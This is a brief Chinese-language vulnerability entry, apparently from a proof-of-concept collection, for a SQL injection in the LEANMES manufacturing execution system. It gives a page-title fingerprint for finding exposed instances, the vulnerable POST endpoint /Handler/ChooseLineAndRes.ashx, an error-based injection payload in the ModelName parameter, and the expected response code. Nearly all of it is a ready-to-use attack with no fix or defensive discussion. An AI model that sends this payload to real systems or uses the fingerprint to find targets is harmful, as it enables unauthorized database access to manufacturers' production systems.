# 深科特LEANMES系统ChooseLineAndRes存在SQL注入漏洞

深科特LEANMES系统 ｜ SQL注入 ｜ —
- **指纹**：`title="LEAN MES - 用户登录"`
- **请求**：`POST /Handler/ChooseLineAndRes.ashx HTTP/1.1`

**Payload**
```
type=GetPDAFunction&ModelName=' and 1<db_name()--
```
- **响应特征**：200